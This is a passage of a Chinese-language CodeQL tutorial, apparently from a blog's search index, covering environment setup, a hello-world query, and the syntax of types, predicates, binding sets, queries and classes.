qlpack.yml\u7684\u5185\u5bb9\u5982\u4e0b name: longlone/codeql-study version: 0.0.1 libraryPathDependencies: codeql-go extractor: go helloworld.ql\u7684\u5185\u5bb9\u5982\u4e0b import go select \"hello world\" \u521b\u5efa\u4e00\u4e2acodeql database\uff0c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6307\u5b9a\u4e00\u4e2ago\u9879\u76ee\u4f5c\u4e3a\u5206\u6790\u76ee\u6807 codeql database create ./codeql_database -s D:\\Coding\\golang\\src\\codeql_study --language=go \u4ecevscode\u4e2d\u9009\u62e9codeql_database\u4f5c\u4e3a\u6570\u636e\u5e93 \u53f3\u952ehelloworld.ql\uff0c\u9009\u62e9 CodeQL: Run Query \u5982\u679c\u663e\u793a\u4ee5\u4e0a\u753b\u9762\uff0c\u90a3\u4e48\u6211\u4eec\u6210\u529f\u5c31\u5b89\u88c5\u597d\u4e86\u73af\u5883!","title":"Hello world"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/","tags":["\u4ee3\u7801\u5ba1\u8ba1","codeql"],"text":"2.CodeQL\u8bed\u6cd5 # \u524d\u8a00 # CodeQL\u7684\u5f88\u591a\u8bed\u6cd5\u548c\u73b0\u5728\u7684\u4e3b\u6d41\u9ad8\u7ea7\u8bed\u8a00\u6709\u5f88\u591a\u76f8\u4f3c\u4e4b\u5904\uff0c\u4f46\u4e5f\u6709\u8bb8\u591a\u7684\u4e0d\u540c\uff0c\u5b66\u4e60\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u3002 \u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5728CodeQL\u4e2d\u4e0d\u5b58\u5728 == \uff0c\u53ea\u6709 = \uff0c\u5f53\u4e00\u4e2a\u53d8\u91cf\u5b9a\u4e49\u4e86\u800c\u6ca1\u6709\u521d\u59cb\u5316\u7684\u65f6\u5019\uff0c = \u7684\u610f\u601d\u662f\u8d4b\u503c\uff0c\u4f46\u5f53\u5176\u5df2\u7ecf\u88ab\u8d4b\u503c\u4e86\u4e4b\u540e\uff0c = \u7684\u610f\u601d\u5c31\u53d8\u6210\u4e86\u6bd4\u8f83\u3002 \u57fa\u7840\u6570\u636e\u7c7b\u578b(Primitive types) # CodeQL \u662f\u4e00\u79cd\u9759\u6001\u7c7b\u578b\u7684\u8bed\u8a00\uff0c\u56e0\u6b64\u6bcf\u4e2a\u53d8\u91cf\u90fd\u5fc5\u987b\u6709\u4e00\u4e2a\u58f0\u660e\u7684\u7c7b\u578b\u3002\u7c7b\u578b\u662f\u4e00\u7ec4\u503c\u3002\u4f8b\u5982\uff0cint \u7c7b\u578b\u662f\u4e00\u7ec4\u6574\u6570\u3002\u6ce8\u610f\uff0c\u4e00\u4e2a\u503c\u53ef\u4ee5\u5c5e\u4e8e\u8fd9\u4e9b\u96c6\u5408\u4e2d\u7684\u591a\u4e2a\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u53ef\u4ee5\u6709\u591a\u4e2a\u7c7b\u578b\u3002 \u6574\u578b(int)\uff0c\u6d6e\u70b9\u578b(float)\uff0c\u65e5\u671f\u578b(date)\uff0c\u5b57\u7b26\u578b(stirng)\uff0c\u5e03\u5c14\u578b(boolean)\uff0c\u7b80\u5355\u4ecb\u7ecd\u4e0b\u65e5\u671f\u578b\u548c\u5e03\u5c14\u578b\u3002 \u65e5\u671f\u578b(date) # \u65e5\u671f\u578b\u53d8\u91cf\u7528\u4e8e\u4fdd\u5b58\u516c\u5386\u8868\u793a\u7684\u65f6\u95f4\u503c\u548c\u65e5\u671f\u503c\uff0c\u5982\u5e74\u3001\u6708\u3001\u65e5\u3001\u65f6\u3001\u5206\u3001\u79d2\u4ee5\u53ca\u6beb\u79d2\u7b49\uff0c\u6ce8\u610f\uff0c\u5b83\u4eec\u7684\u53d6\u503c\u90fd\u662f\u6574\u6570\u3002\u5176\u4e2d\uff0c\u8868\u793a\u5e74\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece-16777216\u523016777215\uff0c\u8868\u793a\u6708\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u4e3a\u4ece0\u523011\uff0c\u8868\u793a\u65e5\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece1\u523031\uff0c\u8868\u793a\u65f6\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece0\u523023\uff0c\u8868\u793a\u5206\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece0\u523059\uff0c\u8868\u793a\u79d2\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece0\u523059\uff0c\u8868\u793a\u6beb\u79d2\u7684\u6574\u6570\u7684\u53d6\u503c\u8303\u56f4\u662f\u4ece0\u5230999\u3002 \u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u5b9e\u4f8b\u7528\u4e8e\u8ba1\u7b97\u4ece\u4eca\u5e749\u67081\u65e5\u5230\u4eca\u5929(11\u67082\u65e5)\u4e00\u5171\u8fc7\u4e86\u591a\u4e45: from date start, date end where start = \"01/09/2021\".toDate() and end = \"02/11/2021\".toDate() select start.daysTo(end) \u8fd9\u91cc\u6211\u4eec\u7528\u5230\u4e86\u5b57\u7b26\u4e32\u7684\u4e00\u4e2a\u5185\u7f6e\u51fd\u6570 toDate() \uff0c\u66f4\u591a\u7684\u76f8\u5173\u51fd\u6570\u53ef\u4ee5\u67e5\u9605CodeQL\u6587\u6863 - string - go - date - go \u5e03\u5c14\u578b(boolean) # \u5e03\u5c14\u578b\u53d8\u91cf\u7528\u6765\u5b58\u653e\u5e03\u5c14\u503c\uff0c\u5373false\uff08\u5047\uff09\u6216\u8005 true\uff08\u771f\uff09\u3002 \u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u6765\u5b9e\u73b0\u4e24\u4e2a\u5e03\u5c14\u4e4b\u95f4\u7684\u548c\u5173\u7cfb: from boolean a, boolean b where a = true and b = false select a.booleanAnd(b) \u66f4\u591a\u76f8\u5173\u51fd\u6570\u53ef\u4ee5\u67e5\u9605CodeQL\u6587\u6863 - boolean - go \u8c13\u8bcd(Predicates) # \u8c13\u8bcd\u6709\u70b9\u7c7b\u4f3c\u4e8e\u5176\u4ed6\u8bed\u8a00\u4e2d\u7684\u51fd\u6570\uff0c\u4f46\u53c8\u4e0e\u51fd\u6570\u4e0d\u540c\uff0c\u8c13\u8bcd\u7528\u4e8e\u63cf\u8ff0\u6784\u6210 QL \u7a0b\u5e8f\u7684\u903b\u8f91\u5173\u7cfb\u3002\u786e\u5207\u7684\u8bf4\uff0c\u8c13\u8bcd\u63cf\u8ff0\u7684\u662f\u7ed9\u5b9a\u53c2\u6570\u4e0e\u5143\u7ec4\u96c6\u5408\u7684\u5173\u7cfb\u3002 \u5b9a\u4e49\u8c13\u8bcd\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6ce8\u610f\u70b9(\u5751\u70b9): 1. \u9700\u8981\u6ce8\u610f\u7684\u662f\u8c13\u8bcd\u7684\u540d\u5b57\u5f00\u5934\u5fc5\u987b\u662f\u5c0f\u5199\u5b57\u6bcd\u3002 2. \u7ed1\u5b9a\u884c\u4e3a\u4e0e\u7ed1\u5b9a\u96c6\uff0c\u8fd9\u4e2a\u5728\u540e\u9762\u4f1a\u4ecb\u7ecd\u3002 \u65e0\u7ed3\u679c\u8c13\u8bcd # \u6ca1\u6709\u7ed3\u679c\u7684\u8c13\u8bcd\u4ee5predicate\u4f5c\u4e3a\u5f00\u5934\uff0c\u5269\u4e0b\u7684\u8bed\u6cd5\u7ed3\u6784\u7c7b\u4f3c\u4e8e\u5b9a\u4e49\u51fd\u6570\u3002\u8fd9\u79cd\u8c13\u8bcd\u53ea\u80fd\u5728where\u8bed\u53e5\u4e2d\u4f7f\u7528 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: predicate isCity(string city) { city = \"Beijing\" or city = \"ShangHai\" } from string city where city = \"Beijing\" and isCity(city) select city \u7ed3\u679c\u8c13\u8bcd # \u6709\u7ed3\u679c\u7684\u8c13\u8bcd\u7684\u5b9a\u4e49\u7c7b\u4f3c\u4e8ec/c++\u8bed\u8a00\u7684\u51fd\u6570\u5b9a\u4e49\uff0c\u4ee5\u8fd4\u56de\u7c7b\u578b\u66ff\u4ee3predicate\u4f5c\u4e3a\u5f00\u5934\u3002\u8fd9\u79cd\u8c13\u8bcd\u53ef\u4ee5\u5728where\u4e0eselect\u8bed\u53e5\u4e2d\u4f7f\u7528 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: int addOne(int i) { result = i + 1 and i in [1 .. 10] } from int v where v = 1 select addOne(v) \u9012\u5f52\u8c13\u8bcd # \u8fd9\u91cc\u8bf4\u7684\u9012\u5f52\u5e76\u975e\u6211\u4eec\u5e38\u89c4\u7406\u89e3\u7684\u51fd\u6570\u9012\u5f52\uff0c\u6211\u4eec\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2areverse(\u53ef\u53cd\u5411\u67e5\u627e\u7684)\u8c13\u8bcd\uff0c\u6216\u8005\u6362\u4e00\u4e2a\u601d\u7ef4\uff0c\u628a\u975e\u9012\u5f52\u7684\u7ed3\u679c\u8c13\u8bcd\u7406\u89e3\u4e3a\u4e00\u4e2a\u6709\u5411\u56fe\uff0c\u90a3\u4e48\u9012\u5f52\u7684\u7ed3\u679c\u8c13\u8bcd\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u65e0\u5411\u56fe\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: string getANeighbor(string country) { country = \"France\" and result = \"Belgium\" or country = \"France\" and result = \"Germany\" or country = \"Germany\" and result = \"Austria\" or country = \"Germany\" and result = \"Belgium\" or country = getANeighbor(result) } from string people where people = getANeighbor(\"Germany\") select people \u53ef\u4ee5\u770b\u5230\u67e5\u8be2\u5230\u4e09\u4e2a\u7ed3\u679c\uff0c France \uff0c Austria \uff0c Belgium \uff0c\u67e5\u8be2\u5230 France \u7684\u539f\u56e0\u5c31\u662f\u5b83\u53ef\u4ee5\u53cd\u5411\u67e5\u627e\u3002 \u7279\u5f81\u8c13\u8bcd\uff0c\u975e\u6210\u5458\u8c13\u8bcd\uff0c\u6210\u5458\u8c13\u8bcd # \u8c13\u8bcd\u5206\u4e3a\u4e09\u79cd\uff0c\u5373\u975e\u6210\u5458\u8c13\u8bcd\u3001\u6210\u5458\u8c13\u8bcd\u548c\u7279\u5f81\u8c13\u8bcd\u3002 \u975e\u6210\u5458\u8c13\u8bcd\u662f\u5728\u7c7b\u4e4b\u5916\u5b9a\u4e49\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u4eec\u4e0d\u662f\u4efb\u4f55\u7c7b\u7684\u6210\u5458\uff0c\u800c\u6210\u5458\u8c13\u8bcd\u5219\u662f\u5728\u7c7b\u91cc\u9762\u5b9a\u4e49\u7684\u3002\u7279\u5f81\u8c13\u8bcd\u5219\u662f\u7c7b\u4e2d\u7684\u7279\u6b8a\u8c13\u8bcd\uff0c\u7c7b\u4f3c\u4e8e\u5176\u4ed6\u8bed\u8a00\u4e2d\u7c7b\u7684\u6784\u9020\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u6bcf\u79cd\u8c13\u8bcd\u7684\u793a\u4f8b\uff1a int getSuccessor(int i) { // 1. Non-member predicate result = i + 1 and i in [1 .. 9] } class FavoriteNumbers extends int { FavoriteNumbers() { // 2. Characteristic predicate this = 1 or this = 4 or this = 9 } string getName() { // 3. Member predicate for the class `FavoriteNumbers` this = 1 and result = \"one\" or this = 4 and result = \"four\" or this = 9 and result = \"nine\" } } \u7ed1\u5b9a\u884c\u4e3a\u4e0e\u7ed1\u5b9a\u96c6 # \u8c13\u8bcd\u6240\u63cf\u8ff0\u7684\u96c6\u5408\u901a\u5e38\u4e0d\u5141\u8bb8\u662f\u65e0\u9650\u7684\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u8c13\u8bcd\u53ea\u80fd\u5305\u542b\u6709\u9650\u6570\u91cf\u7684\u5143\u7ec4(It must be possible to evaluate a predicate in a finite amount of time, so the set it describes is not usually allowed to be infinite. In other words, a predicate can only contain a finite number of tuples.) \u4e3e\u4e2a\u7b80\u5355\u7684\u6b63\u4f8b\u548c\u53cd\u4f8b: // \u6b63\u4f8b\uff0ci\u88ab\u9650\u5b9a\u57281\u523010\u5185\uff0c\u6216\u8005\u4f60\u4e5f\u53ef\u4ee5\u7ed9i\u8d4b\u4e00\u4e2a\u786e\u5b9a\u7684\u503c\u5982i=1 int addOne(int i) { result = i + 1 and i in [1 .. 10] } // \u53cd\u4f8b\uff0ci\u662f\u65e0\u9650\u6570\u91cf\u503c\u7684\uff0c\u6b64\u65f6CodeQL\u7f16\u8bd1\u5668\u4f1a\u62a5\u9519: 'i' is not bound to a value int addOne(int i) { result = i + 1 and i > 0 } \u5355\u4e2a\u7ed1\u5b9a\u96c6 # \u4e3a\u4e86\u4f7f\u4e0a\u8ff0\u7684\u53cd\u4f8b\u8c13\u8bcd\u80fd\u591f\u901a\u8fc7\u7f16\u8bd1\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7ed1\u5b9a\u96c6(bindingset)\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u8c03\u7528\u8fd9\u4e2a\u8c13\u8bcd\u65f6\uff0c\u4f20\u9012\u7684\u53c2\u6570\u8fd8\u662f\u53ea\u80fd\u5728\u6709\u9650\u7684\u53c2\u6570\u96c6\u4e2d\u3002 \u4e0a\u9762\u7684\u53cd\u4f8b\u53ef\u4ee5\u4fee\u6539\u4e3a\u5982\u4e0b: bindingset[i] int addOne(int i) { result = i + 1 and i > 0 } // \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u53bb\u8c03\u7528\u8fd9\u4e2a\u8c13\u8bcd\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u4f20\u9012\u8fc7\u6765\u7684\u53c2\u6570\u8fd8\u662f\u53ea\u80fd\u5728\u6709\u9650\u7684\u53c2\u6570\u96c6\u4e2d from int i where i = 1 select addOne(i) \u591a\u4e2a\u7ed1\u5b9a\u96c6 # \u6211\u4eec\u540c\u6837\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u7ed1\u5b9a\u96c6\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50: bindingset[x] bindingset[y] predicate plusOne(int x, int y) { x + 1 = y } \u8fd9\u4e2a\u7ed1\u5b9a\u96c6\u7684\u610f\u601d\u662f\u5982\u679cx\u6216y\u7ed1\u5b9a(bound)\u4e86\uff0c\u90a3\u4e48x\u548cy\u90fd\u7ed1\u5b9a\uff0c\u5373\u81f3\u5c11\u6709\u4e00\u4e2a\u53c2\u6570\u53d7\u5230\u7ea6\u675f\u3002 \u5982\u679c\u6211\u4eec\u60f3\u8981\u4e24\u8005\u90fd\u53d7\u7ea6\u675f\uff0c\u53ef\u4ee5\u5c06\u4f8b\u5b50\u4fee\u6539\u4e00\u4e0b: bindingset[x, y] predicate plusOne(int x, int y) { x + 1 = y } \u90a3\u4e48\u8fd9\u4e2a\u8c13\u8bcd\u5c31\u53d8\u4e3a\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u4e8e\u6821\u9a8c\u7684\u51fd\u6570\uff0c\u5373 x+1 == y \u67e5\u8be2(Query) # \u67e5\u8be2\u662fCodeQL\u7684\u8f93\u51fa\u3002\u67e5\u8be2\u6709\u4e24\u79cd\u7c7b\u578b\uff0c\u5206\u522b\u662f - select\u5b50\u53e5 - \u67e5\u8be2\u8c13\u8bcd\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5728\u5f53\u524d\u6a21\u5757\u4e2d\u5b9a\u4e49\u6216\u8005\u4ece\u5176\u4ed6\u6a21\u5757\u4e2d\u5bfc\u5165 select\u5b50\u53e5 # select\u5b50\u53e5\u7684\u683c\u5f0f\u5982\u4e0b: [from] /* ... variable declarations ... */ [where] /* ... logical formula ... */ select /* ... expressions ... */ \u5176\u4e2dfrom\u548cwhere\u8bed\u53e5\u662f\u53ef\u9009\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u5728from\u4e2d\u5b9a\u4e49\u53d8\u91cf\uff0c\u5728where\u4e2d\u7ed9\u53d8\u91cf\u8d4b\u503c\u548c\u5bf9\u67e5\u8be2\u7ed3\u679c\u7684\u8fc7\u6ee4\uff0c\u6700\u540e\u5728select\u4e2d\u663e\u793a\u7ed3\u679c\u3002 \u5728select\u8bed\u53e5\u4e2d\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u5173\u952e\u5b57: - as \u5173\u952e\u5b57\uff0c\u540e\u9762\u8ddf\u968f\u4e00\u4e2a\u540d\u5b57\u3002\u4f5c\u7528\u76f8\u5f53\u4e8esql\u4e2d\u7684 as \uff0c\u4e3a\u7ed3\u679c\u5217\u63d0\u4f9b\u4e86\u4e00\u4e2a\"\u6807\u7b7e\"\uff0c\u5e76\u5141\u8bb8\u5728\u540e\u7eed\u7684select\u8868\u8fbe\u5f0f\u4e2d\u4f7f\u7528\u5b83\u4eec\u3002 - order by \u5173\u952e\u5b57\uff0c\u540e\u9762\u8ddf\u968f\u4e00\u4e2a\u4e00\u4e2a\u7ed3\u679c\u5217\u540d\u3002\u4f5c\u7528\u76f8\u5f53\u4e8esql\u4e2d\u7684 order by \uff0c\u7528\u4e8e\u6392\u5e8f\u7ed3\u679c\uff0c\u5e76\u4e14\u5728\u7ed3\u679c\u5217\u540d\u540e\u53ef\u9009 asc (\u5347\u5e8f)\u6216 desc (\u964d\u5e8f)\u5173\u952e\u5b57\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: from int x, int y where x = 3 and y in [0 .. 2] select x, y, x * y as product, \"product: \" + product \u67e5\u8be2\u8c13\u8bcd # \u67e5\u8be2\u8c13\u8bcd\u662f\u4e00\u4e2a\u975e\u6210\u5458\u8c13\u8bcd\uff0c\u5e76\u5728\u6700\u5f00\u5934\u4f7f\u7528 query \u4f5c\u4e3a\u6ce8\u89e3\u3002\u5b83\u8fd4\u56de\u8c13\u8bcd\u8ba1\u7b97\u7ed3\u679c\u7684\u6240\u6709\u5143\u7ec4\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b: query int getProduct(int x, int y) { x = 3 and y in [0 .. 2] and result = x * y } \u5b83\u8fd4\u56de\u7684\u7ed3\u679c\u5982\u4e0b: \u7f16\u5199\u67e5\u8be2\u8c13\u8bcd\u800c\u4e0d\u662fselect\u5b50\u53e5\u7684\u597d\u5904\u662f\u6211\u4eec\u53ef\u4ee5\u5728\u4ee3\u7801\u7684\u5176\u4ed6\u90e8\u5206\u4e2d\u8c03\u7528\u8c13\u8bcd\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u7c7b\u4e2d\u7684\u7279\u5f81\u8c13\u8bcd\u5185\u90e8\u8c03\u7528: query int getProduct(int x, int y) { x = 3 and y in [0 .. 2] and result = x * y } class MultipleOfThree extends int { MultipleOfThree() { this = getProduct(_, _) } } from MultipleOfThree m select m \u8fd9\u6837\u6211\u4eec\u67e5\u8be2\u7ed3\u679c\u5c31\u67092\u4e2a\uff0c\u4e00\u4e2a\u662f\u5185\u7f6e\u7684 #select \uff0c\u4e00\u4e2a\u662f getProduct \uff0c #select \u7684\u7ed3\u679c\u5982\u4e0b: \u7c7b(Classes) # \u6211\u4eec\u53ef\u4ee5\u5728CodeQL\u4e2d\u5b9a\u4e49\u81ea\u5df1\u7684\u7c7b\u578b\uff0c\u4e00\u4e2a\u65b9\u6cd5\u662f\u5b9a\u4e49\u4e00\u4e2a\u7c7b\u3002 \u7c7b\u63d0\u4f9b\u4e86\u4e00\u79cd\u7b80\u5355\u7684\u65b9\u6cd5\u6765\u91cd\u7528\u548c\u6784\u9020\u4ee3\u7801\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5: - \u5728\u7c7b\u4e2d\u5b9a\u4e49\u6210\u5458\u8c13\u8bcd - \u5b9a\u4e49\u5b50\u7c7b\u4ee5\u91cd\u5199\u6210\u5458\u8c13\u8bcd \u7c7b\u7684\u5b9a\u4e49 # \u5b9a\u4e49\u7c7b\u7684\u683c\u5f0f\u5982\u4e0b: class ClassName [extends Parent] { // ... } \u6ce8\u610f\u8fd9\u91cc\u6709\u4e2a\u5751\u70b9\u662f\u7c7b\u540d\u9996\u5b57\u6bcd\u5fc5\u987b\u662f\u5927\u5199\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: class OneTwoThree extends int { OneTwoThree() { // characteristic predicate this = 1 or this = 2 or this = 3 } string getAString() { // member predicate result = \"One, two or three: \" + this.toString() } predicate isEven() { // member predicate this = 2 } } \u5728CodeQL\u4e2d\uff0c\u7c7b\u5141\u8bb8\u591a\u91cd\u7ee7\u627f\uff0c\u4f46\u662f\u4ee5\u4e0b\u64cd\u4f5c\u662f\u975e\u6cd5\u7684: - \u4e0d\u80fd\u7ee7\u627f\u672c\u8eab - \u4e0d\u80fd\u7ee7\u627ffinal\u7c7b - \u4e0d\u80fd\u7ee7\u627f\u4e0d\u517c\u5bb9\u7684\u7c7b\u578b\uff0c\u8bf7\u53c2\u9605 \u7c7b\u578b\u517c\u5bb9\u6027 \u7c7b\u7684\u4e3b\u4f53 # \u7c7b\u7684\u4e3b\u4f53\u53ef\u4ee5\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9 - \u4e00\u4e2a\u7279\u5f81\u8c13\u8bcd - \u4efb\u610f\u6570\u91cf\u7684\u6210\u5458\u8c13\u8bcd - \u4efb\u610f\u6570\u91cf\u7684\u5b57\u6bb5(field) \u5728\u7c7b\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528this\u6765\u6307\u4ee3\u7c7b\u672c\u8eab\u3002\u5f53\u6211\u4eec\u5b9a\u4e49\u7c7b\u65f6\uff0c\u8be5\u7c7b\u8fd8\u4f1a\u4ece\u5176\u7236\u7c7b\u7ee7\u627f\u6240\u6709\u975e\u79c1\u6709\u6210\u5458\u8c13\u8bcd\u548c\u5b57\u6bb5\uff0c\u6211\u4eec\u53ef\u4ee5\u8986\u76d6(override)\u8fd9\u4e9b\u8c13\u8bcd\u548c\u5b57\u6bb5\u3002 \u7279\u5f81\u8c13\u8bcd # \u7c7b\u4f3c\u4e8e\u5176\u4ed6\u8bed\u8a00\u4e2d\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u53ea\u80fd\u5b9a\u4e49\u4e00\u4e2a\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u7279\u5f81\u8c13\u8bcd\u4e2d\u4f7f\u7528this\u6765\u9650\u5236\u7c7b\u4e2d\u53ef\u80fd\u7684\u503c\u3002\u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\uff0c OneTwoThree \u88ab\u9650\u5236\u4e3a1-3\u4e2d\u7684\u6574\u6570\u3002 \u6210\u5458\u8c13\u8bcd # \u8fd9\u4e9b\u8c13\u8bcd\u4ec5\u9002\u7528\u4e8e\u7c7b\u4e2d\u3002\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u53bb\u8c03\u7528\u4e0a\u8ff0\u7c7b\u7684\u6210\u5458\u8c13\u8bcd: (OneTwoThree).getAString() // \u7ed3\u679c\u662f One, two or three: 1 \u5b57\u6bb5(Field) # \u5b57\u6bb5\u662f\u5728\u7c7b\u7684\u4e3b\u9898\u4e2d\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u4e00\u4e2a\u7c7b\u7684\u4e3b\u9898\u4e2d\u53ef\u4ee5\u6709\u4efb\u610f\u6570\u91cf\u7684\u5b57\u6bb5\u58f0\u660e\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u7c7b\u4e2d\u7684\u8c13\u8bcd\u9002\u7528\u8fd9\u4e9b\u53d8\u91cf\uff0c\u7528\u6cd5\u548cthis\u7c7b\u4f3c\uff0c\u5b57\u6bb5\u5fc5\u987b\u53d7\u9650\u4e8e\u7279\u5f81\u8c13\u8bcd\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b\uff0c\u5b83\u8f93\u51fa10\u4ee5\u5185\u6bcf\u4e2a\u6570\u5b57\u7684\u9664\u6570: class SmallInt extends int { SmallInt() { this = [1 .. 10] } } class DivisibleInt extends SmallInt { SmallInt divisor; // declaration of the field `divisor` DivisibleInt() { this % divisor = 0 } SmallInt getADivisor() { result = divisor } } from DivisibleInt i select i, i.getADivisor() \u5177\u4f53\u7c7b # \u4e0a\u9762\u7684\u4f8b\u5b50\u90fd\u662f\u5177\u4f53\u7c7b\uff0c\u5177\u4f53\u7c7b\u662f\u901a\u8fc7\u9650\u5236\u8f83\u5927\u7c7b\u578b\u4e2d\u7684\u503c\u6765\u5b9a\u4e49\u7684\u3002 \u62bd\u8c61\u7c7b # \u62bd\u8c61\u7c7b\u4f7f\u7528\u5173\u952e\u5b57 abstract \u653e\u5728\u5173\u952e\u5b57 class \u524d\u6765\u5b9a\u4e49\u3002\u62bd\u8c61\u7684\u6982\u5ff5\u76f8\u4fe1\u5728\u8bb8\u591a\u5176\u4ed6\u8bed\u8a00\u4e2d\u6211\u4eec\u90fd\u6709\u63a5\u89e6\u5230(\u4f8b\u5982java)\u3002\u62bd\u8c61\u7c7b\u6211\u4eec\u53c8\u53ef\u4ee5\u53eb\u505a\u5143\u7c7b\uff0c\u5b83\u5b9a\u4e49\u5176\u5b50\u7c7b\u7684\u8c13\u8bcd\u548c\u5b57\u6bb5\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: import go abstract class SqlExpr extends Expr { int ID; } class PostgresSqlExpr extends SqlExpr { PostgresSqlExpr(){ ID=1 } } class MySqlExpr extends SqlExpr { MySqlExpr(){ ID=2 } } \u91cd\u5199\u6210\u5458\u8c13\u8bcd # \u6211\u4eec\u4f7f\u7528\u5173\u952e\u5b57 override \u6765\u91cd\u5199\u4e00\u4e2a\u6210\u5458\u8c13\u8bcd\uff0c\u5b50\u7c7b\u91cd\u5199\u7684\u6210\u5458\u8c13\u8bcd\u4f1a\u5f71\u54cd\u7236\u7c7b\u7684\u6210\u5458\u8c13\u8bcd\u3002 \u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u6269\u5c55\u4e0a\u9762\u7684 OneTwoThree \u7c7b: class OneTwo extends OneTwoThree { OneTwo() { this = 1 or this = 2 } override string getAString() { result = \"One or two: \" + this.toString() } } \u90a3\u4e48\u5047\u5982\u6211\u4eec\u7f16\u5199\u4ee5\u4e0b\u67e5\u8be2: from OneTwoThree o select o, o.getAString() \u5f97\u5230\u7684\u7ed3\u679c\u5982\u4e0b: \u5728CodeQL\u4e2d\uff0c\u4e0e\u5176\u4ed6\u8bed\u8a00\u4e0d\u540c\uff0c\u76f8\u540c\u7236\u7c7b\u7684\u5b50\u7c7b\u4e0d\u4f1a\u4e92\u76f8\u51b2\u7a81\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2aTwoThree\uff0c\u5b83\u540c\u6837\u7ee7\u627f\u4e8e OneTwoThree \uff0c\u5b83\u7684\u7279\u5f81\u8c13\u8bcd\u7684\u4e00\u90e8\u5206\u4e0e OneTwo \u91cd\u53e0\u3002 class TwoThree extends OneTwoThree { TwoThree() { this = 2 or this = 3 } override string getAString() { result = \"Two or three: \" + this.toString() } } \u73b0\u5728\u6574\u65702\u65e2\u662f TwoThree \u4e5f\u662f OneTwo \u7684\u7279\u5f81\uff0c\u8fd9\u4e24\u4e2a\u7c7b\u90fd\u8986\u76d6\u4e86\u539f\u59cb\u7236\u7c7b\u7684\u6210\u5458\u8c13\u8bcd getAString \uff0c\u90a3\u4e48\u6211\u4eec\u91cd\u65b0\u6267\u884c\u4e0a\u8ff0\u67e5\u8be2\uff0c\u5728\u9047\u52302\u65f6\u4f1a\u5f97\u52302\u4e2a\u7ed3\u679c: \u591a\u91cd\u7ee7\u627f # \u5728CodeQL\u4e2d\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u7ee7\u627f\u591a\u4e2a\u7c7b\u578b\uff0c\u4f8b\u5982: class Two extends OneTwo, TwoThree {} \u8fd9\u4e2a\u7c7b Two \u540c\u65f6\u7ee7\u627f\u4e86 OneTwo \u548c TwoThree \uff0c\u5b83\u8fd8\u95f4\u63a5\u7ee7\u627f\u81ea OneTwoThree \u548c int \uff0c\u90a3\u4e48\u901a\u8fc7\u7279\u5f81\u8c13\u8bcd\u6211\u4eec\u77e5\u9053\u5176\u503c\u53ea\u80fd\u662f2\u3002 